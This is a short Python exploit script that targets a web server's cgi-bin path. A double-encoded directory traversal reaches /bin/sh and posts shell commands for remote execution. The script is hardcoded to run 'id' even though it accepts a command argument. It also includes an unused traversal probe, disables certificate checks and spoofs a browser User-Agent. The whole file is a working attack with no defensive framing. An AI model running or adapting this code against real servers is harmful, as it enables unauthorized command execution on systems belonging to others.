import sys
import urllib
from urllib import parse

import requests

def execCommand(ip,cmd):
    para = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
    payload = urllib.parse.quote(para, safe="/%")
    data_1= 'echo;id'
    data_1=data_1.encode('ascii')
    res=requests.post(ip+payload,data=data_1,verify=False,headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"})
    print(res.content.decode('utf-8'))

def pathTravis(ip):
    res = requests.get(ip + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e",verify=False)
    print(res.text)

if __name__ == '__main__':
    ip = sys.argv[1]
    cmd = sys.argv[2]
    if len(sys.argv)==3:
        execCommand(ip,cmd)